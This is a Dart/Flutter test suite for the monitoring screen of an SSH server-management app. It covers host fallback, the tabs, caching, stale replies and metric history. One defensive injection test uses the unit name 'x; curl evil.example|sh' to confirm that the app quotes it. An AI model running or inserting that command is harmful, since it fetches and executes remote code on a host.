import 'dart:async';

import 'package:drift/drift.dart' show Value;
import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:omniterm/data/app_database.dart';
import 'package:omniterm/data/app_repository.dart';
import 'package:omniterm/data/remote_models.dart';
import 'package:omniterm/data/ssh/ssh_transport.dart';
import 'package:omniterm/platform/secret_store.dart';
import 'package:omniterm/ui/view_model/app_state.dart';
import 'package:omniterm/ui/view_model/monitor_view_model.dart';
import 'package:omniterm/ui/view_model/telemetry_poller.dart';

import 'support/fake_secure_storage.dart';

/// Records every command it is asked to run and replies from a scripted map.
class RecordingTransport implements SshTransport {
  RecordingTransport({this.replies = const {}, this.fallback = ''});

  Map<Pattern, String> replies;
  final String fallback;

  /// When set, every `exec` throws it — simulating a dropped connection.
  Object? failure;

  final List<String> commands = [];
  final List<String?> stdins = [];

  /// Completes each `exec` only when released, so a slow reply can be simulated.
  Completer<void>? gate;

  @override
  Future<String> exec(
    SshCredentials creds,
    String command, {
    String? stdin,
  }) async {
    commands.add(command);
    stdins.add(stdin);
    if (gate != null) await gate!.future;
    if (failure != null) throw failure!;
    for (final entry in replies.entries) {
      if (command.contains(entry.key)) return entry.value;
    }
    return fallback;
  }

  /// Streams the same scripted reply in one chunk, so a caller that streams and a caller that
  /// awaits see the same output.
  @override
  Future<String> execStream(
    SshCredentials creds,
    String command, {
    String? stdin,
    SshCancellationToken? cancellation,
    required Future<void> Function(String chunk) onChunk,
  }) async {
    final out = await exec(creds, command, stdin: stdin);
    await onChunk(out);
    return out;
  }

  @override
  noSuchMethod(Invocation invocation) => throw UnimplementedError();
}

void main() {
  late AppDatabase db;
  late AppRepository repo;
  late AppState app;

  setUp(() {
    db = AppDatabase(NativeDatabase.memory());
    repo = AppRepository(
      db,
      SecretStore(storage: FakeSecureStorage(<String, String>{})),
    );
    app = AppState(repo);
  });

  tearDown(() async {
    app.dispose();
    await db.close();
  });

  Server server({
    required String name,
    String status = 'online',
    String sudoPassword = '',
  }) => Server(
    id: 0,
    name: name,
    host: '10.0.0.1',
    port: 22,
    username: 'root',
    serverColor: 'Default',
    authType: 'password',
    authPassword: 'pw',
    sudoPassword: sudoPassword,
    notes: '',
    keepAlive: 30,
    sshCompression: false,
    persistentSession: false,
    proxyCommand: '',
    proxyType: 'none',
    proxyHost: '',
    proxyPort: 0,
    proxyUser: '',
    proxyPassword: '',
    agentForwarding: false,
    healthScore: 100,
    lastLatency: 0,
    status: status,
    authStatus: 'ok',
  );

  Future<MonitorViewModel> boot({RecordingTransport? transport}) async {
    await app.start();
    await Future<void>.delayed(Duration.zero);
    return MonitorViewModel(app, transport: transport);
  }

  group('which host is monitored', () {
    test('nothing online means the empty state', () async {
      await repo.insertServer(server(name: 'a', status: 'offline'));
      final vm = await boot();
      expect(vm.hasNoOnlineHosts, isTrue);
      expect(vm.monitoredServer, isNull);
      vm.dispose();
    });

    test(
      'with no explicit selection it falls back to the first online host',
      () async {
        await repo.insertServer(server(name: 'down', status: 'offline'));
        final upId = await repo.insertServer(server(name: 'up'));
        final vm = await boot();
        await Future<void>.delayed(Duration.zero);
        expect(vm.monitoredServer?.id, upId);
        vm.dispose();
      },
    );

    test('the explicit selection wins when it is online', () async {
      await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot();
      app.selectedServerId = bId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.monitoredServer?.name, 'b');
      vm.dispose();
    });

    test('a selected host that goes offline is not monitored — §15.4', () async {
      // The Kotlin honoured the selection unconditionally, so Monitor kept rendering an offline
      // host that the online-only selector bar above it no longer listed, with no way to switch
      // away and every tab still issuing commands at a host that was down.
      final aId = await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot();
      app.selectedServerId = aId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.monitoredServer?.id, aId);

      await repo.updateServer(
        (await repo.getServerById(aId))!.copyWith(status: 'offline'),
      );
      await Future<void>.delayed(Duration.zero);

      expect(
        vm.monitoredServer?.id,
        bId,
        reason: 'it falls back to a host that can answer',
      );
      vm.dispose();
    });

    test(
      'the last online host going down returns to the empty state',
      () async {
        final id = await repo.insertServer(server(name: 'only'));
        final vm = await boot();
        await Future<void>.delayed(Duration.zero);
        expect(vm.hasNoOnlineHosts, isFalse);

        await repo.updateServer(
          (await repo.getServerById(id))!.copyWith(status: 'offline'),
        );
        await Future<void>.delayed(Duration.zero);
        expect(vm.hasNoOnlineHosts, isTrue);
        vm.dispose();
      },
    );
  });

  group('tabs', () {
    test(
      'refresh fetches what the active tab shows, not host metrics',
      () async {
        // Refreshing Monitor on the Services tab has to fetch services.
        await repo.insertServer(server(name: 'a'));
        final transport = RecordingTransport();
        final vm = await boot(transport: transport);
        await Future<void>.delayed(Duration.zero);

        vm.activeTab = MonitorTab.services;
        await Future<void>.delayed(Duration.zero);
        expect(transport.commands.last, contains('systemctl list-units'));

        vm.activeTab = MonitorTab.logs;
        await Future<void>.delayed(Duration.zero);
        expect(transport.commands.last, contains('journalctl'));

        vm.activeTab = MonitorTab.processes;
        await Future<void>.delayed(Duration.zero);
        expect(transport.commands.last, contains('ps -eo'));
        vm.dispose();
      },
    );

    test(
      'overview fetches host metrics and caches the OS for the other tabs',
      () async {
        final id = await repo.insertServer(server(name: 'a'));
        final transport = RecordingTransport(
          replies: {"echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n'},
        );
        final vm = await boot(transport: transport);
        await Future<void>.delayed(Duration.zero);
        await vm.loadActiveTab();

        expect(transport.commands.single, contains('@LOAD'));
        // Probing uname once and caching it beats every tab asking for itself.
        expect(app.osForServer(id), 'FreeBSD');
        await vm.loadProcesses();
        expect(
          transport.commands.last,
          contains('ps -axo'),
          reason: 'the cached OS must pick the BSD ps variant',
        );
        vm.dispose();
      },
    );
  });

  group('processes', () {
    const psOutput = '''
  PID USER     %CPU %MEM    VSZ     ELAPSED STAT COMMAND
  101 root      5.0 40.0 100000    01:00:00 S    lowcpu-highmem
  102 root     90.0  1.0 100000    01:00:00 S    highcpu-lowmem
''';

    test('loads and sorts by CPU by default', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(
        transport: RecordingTransport(replies: {'ps -eo': psOutput}),
      );
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();

      expect(vm.processes.first.name, 'highcpu-lowmem');
      vm.dispose();
    });

    test('switching to memory re-sorts without another round trip', () async {
      // The Kotlin re-fetched from the host on a sort toggle, so the user waited on the network to
      // reorder a list already in hand.
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {'ps -eo': psOutput});
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();
      final callsAfterLoad = transport.commands.length;

      vm.sortByCpu = false;
      expect(vm.processes.first.name, 'lowcpu-highmem');
      expect(transport.commands.length, callsAfterLoad);
      vm.dispose();
    });

    test('expanding a row toggles, and only one row is open', () async {
      final vm = await boot();
      vm.toggleProcessExpanded(101);
      expect(vm.expandedProcessPid, 101);
      vm.toggleProcessExpanded(102);
      expect(vm.expandedProcessPid, 102);
      vm.toggleProcessExpanded(102);
      expect(vm.expandedProcessPid, isNull);
      vm.dispose();
    });
  });

  group('services', () {
    test('a host with no service manager says so', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(
        transport: RecordingTransport(
          replies: {'systemctl list-units': '---NOSYSTEMD---'},
        ),
      );
      await Future<void>.delayed(Duration.zero);
      await vm.loadServices();

      expect(
        vm.servicesUnsupported,
        isTrue,
        reason: 'otherwise the tab looks like a host running nothing',
      );
      vm.dispose();
    });

    test(
      'an action sends the sudo password via stdin, never in the command',
      () async {
        await repo.insertServer(server(name: 'a', sudoPassword: 'hunter2'));
        final transport = RecordingTransport();
        final vm = await boot(transport: transport);
        await Future<void>.delayed(Duration.zero);

        await vm.runServiceAction(
          SimService(
            name: 'nginx',
            desc: '',
            status: 'running',
            subState: 'active',
          ),
          'restart',
        );

        final actionIndex = transport.commands.indexWhere(
          (c) => c.contains('systemctl restart'),
        );
        expect(actionIndex, isNot(-1));
        expect(transport.commands[actionIndex], isNot(contains('hunter2')));
        expect(transport.stdins[actionIndex], 'hunter2\n');
        vm.dispose();
      },
    );

    test('a unit name cannot inject a command', () async {
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      await vm.runServiceAction(
        SimService(
          name: r'x; curl evil.example|sh',
          desc: '',
          status: 'dead',
          subState: 'dead',
        ),
        'restart',
      );

      final cmd = transport.commands.firstWhere(
        (c) => c.contains('systemctl restart'),
      );
      expect(
        cmd,
        contains(r"'x; curl evil.example|sh'"),
        reason: 'quoted, so the shell treats the whole thing as one unit name',
      );
      vm.dispose();
    });
  });

  group('logs', () {
    const journal = '''
2026-08-04T10:00:00+0000 host sshd: accepted connection
2026-08-04T10:00:01+0000 host kernel: disk errors detected
2026-08-04T10:00:02+0000 host cron: job timeout waiting
''';

    test(
      'a host with no log source is distinguished from one with no lines',
      () async {
        await repo.insertServer(server(name: 'a'));
        final vm = await boot(
          transport: RecordingTransport(
            replies: {'journalctl': '---NOLOGS---'},
          ),
        );
        await Future<void>.delayed(Duration.zero);
        await vm.loadLogs();

        expect(vm.logsUnsupported, isTrue);
        expect(vm.logs, isEmpty);
        vm.dispose();
      },
    );

    test(
      'the level filter narrows what was already fetched, without refetching',
      () async {
        await repo.insertServer(server(name: 'a'));
        final transport = RecordingTransport(replies: {'journalctl': journal});
        final vm = await boot(transport: transport);
        await Future<void>.delayed(Duration.zero);
        await vm.loadLogs();
        final calls = transport.commands.length;

        expect(vm.filteredLogs, hasLength(3));

        vm.logFilter = 'ERROR';
        expect(transport.commands.length, calls, reason: 'filtering is local');
        expect(vm.filteredLogs.every((l) => l.level == 'ERROR'), isTrue);
        expect(
          vm.filteredLogs,
          isNotEmpty,
          reason:
              '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix',
        );

        vm.logFilter = 'ALL';
        expect(vm.filteredLogs, hasLength(3));
        vm.dispose();
      },
    );

    test('turning live off cancels the timer', () async {
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {'journalctl': journal});
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      vm.logsLive = true;
      expect(vm.logsLive, isTrue);
      vm.logsLive = false;
      expect(vm.logsLive, isFalse);
      // Disposing with a live timer still running would fire loads against a disposed notifier.
      vm.dispose();
    });
  });

  group('stale replies', () {
    test(
      'a reply for a host the user left does not overwrite the new host',
      () async {
        final aId = await repo.insertServer(server(name: 'a'));
        final bId = await repo.insertServer(server(name: 'b'));
        final transport = RecordingTransport(
          replies: {
            'ps -eo':
                '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
                '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
          },
        );
        final vm = await boot(transport: transport);
        app.selectedServerId = aId;
        await Future<void>.delayed(Duration.zero);

        transport.gate = Completer<void>();
        final pending = vm.loadProcesses();

        // The user switches host while the first fetch is still in flight.
        app.selectedServerId = bId;
        await Future<void>.delayed(Duration.zero);

        transport.gate!.complete();
        await pending;

        expect(
          vm.processes.any((p) => p.name == 'stale-proc'),
          isFalse,
          reason:
              "one machine's processes must never be shown under another's name",
        );
        vm.dispose();
      },
    );

    test(
      'an overlapping refresh of the same tab does not land after the newer one',
      () async {
        // The host check is not enough: the live timer fires while a manual refresh is in flight, so
        // two loads of the *same* tab on the *same* host race, and both pass an identity check. This
        // is what `OperationGeneration` is for — the Kotlin helper the port carried across and, for a
        // while, never called.
        await repo.insertServer(server(name: 'a'));
        final transport = RecordingTransport();
        final vm = await boot(transport: transport);
        await Future<void>.delayed(Duration.zero);

        final first = Completer<void>();
        transport.gate = first;
        final stale = vm.loadProcesses();

        final second = Completer<void>();
        transport.gate = second;
        final fresh = vm.loadProcesses();

        // The newer request answers first.
        transport.replies = {
          'ps -eo':
              '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
              '  2 root 1.0 1.0 100 01:00:00 S fresh-proc\n',
        };
        second.complete();
        await fresh;
        expect(vm.processes.single.name, 'fresh-proc');

        // …and the one it superseded answers afterwards.
        transport.replies = {
          'ps -eo':
              '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
              '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
        };
        first.complete();
        await stale;

        expect(
          vm.processes.single.name,
          'fresh-proc',
          reason: 'the superseded load must not overwrite the newer result',
        );
        expect(vm.processesLoading, isFalse);
        vm.dispose();
      },
    );

    test('a load completing after the screen is closed does not throw', () async {
      // Leaving Monitor while a fetch is in flight is ordinary use; notifying a disposed
      // ChangeNotifier throws, which would crash the app on the way out.
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      transport.gate = Completer<void>();
      final pending = vm.loadProcesses();
      vm.dispose();
      transport.gate!.complete();

      await expectLater(pending, completes);
    });

    test('switching host clears the previous host data immediately', () async {
      final aId = await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot(
        transport: RecordingTransport(
          replies: {
            'ps -eo':
                '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
                '  1 root 9.0 1.0 100 01:00:00 S proc-a\n',
          },
        ),
      );
      app.selectedServerId = aId;
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();
      expect(vm.processes, isNotEmpty);

      app.selectedServerId = bId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.processes, isEmpty);
      vm.dispose();
    });
  });

  group('no transport', () {
    test(
      'monitoring reports unavailable rather than showing an empty host',
      () async {
        await repo.insertServer(server(name: 'a'));
        final vm = await boot();
        await Future<void>.delayed(Duration.zero);

        expect(vm.canMonitor, isFalse);
        await vm.loadServices();
        expect(vm.error, isNotNull);
        expect(vm.services, isEmpty);
        vm.dispose();
      },
    );
  });

  group('the fleet telemetry poller', () {
    /// Ten percent of memory used, in the shapes `free -b` and `df -PB1 /` actually print.
    const reply =
        '@OS\nLinux\n'
        '@MEM\nMem: 100 10 0 0 0 90\n'
        '@DISK\n/dev/sda1 100 1 1 1% /\n';

    test(
      'Monitor shows the poller\'s sample without fetching for itself',
      () async {
        // Two loops fetching the same numbers on different cadences is how one screen ends up
        // disagreeing with another about the same host.
        final id = await repo.insertServer(server(name: 'a'));
        await app.start();
        await Future<void>.delayed(Duration.zero);

        final transport = RecordingTransport(fallback: reply);
        final poller = TelemetryPoller(app, transport: transport);
        final vm = MonitorViewModel(app, poller: poller);
        await poller.cycle();

        expect(vm.monitoredServer?.id, id);
        expect(vm.metrics.memPercent, closeTo(10, 0.001));
        vm.dispose();
        poller.dispose();
      },
    );

    test(
      'the countdown and the sample age come from the poller, not a second timer',
      () async {
        await repo.insertServer(server(name: 'a'));
        await app.start();
        await Future<void>.delayed(Duration.zero);

        final at = DateTime(2026, 8, 5, 12);
        final poller = TelemetryPoller(
          app,
          transport: RecordingTransport(fallback: reply),
          interval: const Duration(seconds: 15),
          clock: () => at,
        );
        final vm = MonitorViewModel(app, poller: poller);

        expect(
          vm.nextRefreshAt,
          isNull,
          reason: 'nothing has been sampled yet',
        );
        await poller.cycle();

        expect(vm.nextRefreshAt, at.add(const Duration(seconds: 15)));
        expect(vm.metricsSampledAt, at);
        vm.dispose();
        poller.dispose();
      },
    );

    test(
      "the age describes the reading on screen, whichever loop fetched it",
      () async {
        // Found on a device: for the first fifteen seconds Overview showed its own fetch while the
        // line above it said "waiting for the first sample", which reads as "do not trust these".
        await repo.insertServer(server(name: 'a'));
        await app.start();
        await Future<void>.delayed(Duration.zero);

        final poller = TelemetryPoller(
          app,
          transport: RecordingTransport(fallback: reply),
        );
        final vm = MonitorViewModel(
          app,
          transport: RecordingTransport(fallback: reply),
          poller: poller,
        );
        expect(
          vm.metricsSampledAt,
          isNull,
          reason: 'nothing has been fetched at all yet',
        );

        await vm.loadHostMetrics();
        for (var i = 0; i < 5 && vm.metrics.memTotalBytes == 0; i++) {
          await Future<void>.delayed(Duration.zero);
        }

        expect(vm.metricsSampledAt, isNotNull);
        vm.dispose();
        poller.dispose();
      },
    );

    test('with no poller Monitor still fetches for itself', () async {
      // Every build without SSH wired, and the manual refresh in the ones that have it.
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(transport: RecordingTransport(fallback: reply));
      await Future<void>.delayed(Duration.zero);
      await vm.loadHostMetrics();
      // The host list re-emitting starts a load of its own, and the generation guard keeps the
      // newer one — so the figure lands a turn later than the call that asked for it.
      for (var i = 0; i < 5 && vm.metrics.memTotalBytes == 0; i++) {
        await Future<void>.delayed(Duration.zero);
      }

      expect(vm.nextRefreshAt, isNull);
      expect(vm.metrics.memPercent, closeTo(10, 0.001));
      vm.dispose();
    });
  });

  test(
    'a credential failure surfaces as an error, not as a blank tab',
    () async {
      await repo.insertServer(
        server(
          name: 'a',
        ).copyWith(authType: 'key', authKeyAlias: const Value('gone')),
      );
      final vm = await boot(transport: RecordingTransport());
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();

      expect(vm.error, contains('gone'));
      vm.dispose();
    },
  );

  /// The retained 7-day history, ported from the `7-DAY HISTORY` block in `ui/MonitorScreen.kt:768`.
  ///
  /// The telemetry poller has always written these rows and the pruning setting has always trimmed
  /// them — but nothing read them back, so `buildHourlyMetricSeries` was fully implemented, unit
  /// tested, and unreachable from the app.
  group('retained history', () {
    const hourMs = 3600000;

    Future<void> addMetric(
      int serverId, {
      required int hour,
      double cpu = 10,
      double ram = 20,
      double? temperature,
    }) => db.serverDao.insertMetric(
      MetricHistoryCompanion.insert(
        serverId: serverId,
        timestamp: DateTime.now().millisecondsSinceEpoch - hour * hourMs,
        cpuUsage: cpu,
        ramUsage: ram,
        diskUsage: 0,
        latency: 0,
        networkIn: 0,
        networkOut: 0,
        cpuTemperatureC: Value(temperature),
      ),
    );

    test('no stored rows means no series to draw', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot();
      await vm.loadHourlySeries();

      expect(vm.hourlySeries?.cpu ?? const [], isEmpty);
      vm.dispose();
    });

    test('stored rows are condensed to one point per hour', () async {
      final id = await repo.insertServer(server(name: 'a'));
      // Two readings in one hour, one in another: three rows, two points.
      await addMetric(id, hour: 2, cpu: 10);
      await addMetric(id, hour: 2, cpu: 30);
      await addMetric(id, hour: 1, cpu: 50);
      final vm = await boot();

      await vm.loadHourlySeries();

      expect(vm.hourlySeries!.cpu, hasLength(2));
      expect(
        vm.hourlySeries!.cpu.first.value,
        20,
        reason: 'the bucket is an average, not the last reading',
      );
      vm.dispose();
    });

    test('a host with no thermal sensor yields no temperature series', () async {
      // Drawing it flat at zero would say the machine is running at 0°.
      final id = await repo.insertServer(server(name: 'a'));
      await addMetric(id, hour: 2);
      await addMetric(id, hour: 1);
      final vm = await boot();

      await vm.loadHourlySeries();

      expect(vm.hourlySeries!.cpu, isNotEmpty);
      expect(vm.hourlySeries!.temperature, isEmpty);
      vm.dispose();
    });

    test('recorded temperatures do reach the series', () async {
      final id = await repo.insertServer(server(name: 'a'));
      await addMetric(id, hour: 2, temperature: 40);
      await addMetric(id, hour: 1, temperature: 60);
      final vm = await boot();

      await vm.loadHourlySeries();

      expect(vm.hourlySeries!.temperature.map((p) => p.value), [40, 60]);
      vm.dispose();
    });

    test('rows older than the window are excluded', () async {
      final id = await repo.insertServer(server(name: 'a'));
      await addMetric(id, hour: 24 * 9, cpu: 99);
      await addMetric(id, hour: 2, cpu: 10);
      await addMetric(id, hour: 1, cpu: 10);
      final vm = await boot();

      await vm.loadHourlySeries();

      expect(vm.hourlySeries!.cpu, hasLength(2));
      expect(
        vm.hourlySeries!.cpu.map((p) => p.value),
        isNot(contains(99)),
        reason: 'the card claims seven days, so it must not draw older data',
      );
      vm.dispose();
    });

    test('another host\'s history is never shown under this host', () async {
      final a = await repo.insertServer(server(name: 'a'));
      final b = await repo.insertServer(server(name: 'b'));
      await addMetric(a, hour: 2, cpu: 11);
      await addMetric(a, hour: 1, cpu: 11);
      await addMetric(b, hour: 2, cpu: 88);
      await addMetric(b, hour: 1, cpu: 88);
      final vm = await boot();

      vm.selectServer(a);
      await vm.loadHourlySeries();
      expect(vm.hourlySeries!.cpu.every((p) => p.value == 11), isTrue);

      vm.selectServer(b);
      await vm.loadHourlySeries();
      expect(
        vm.hourlySeries!.cpu.every((p) => p.value == 88),
        isTrue,
        reason: 'switching hosts must re-read, not keep the previous chart',
      );
      vm.dispose();
    });
  });
}
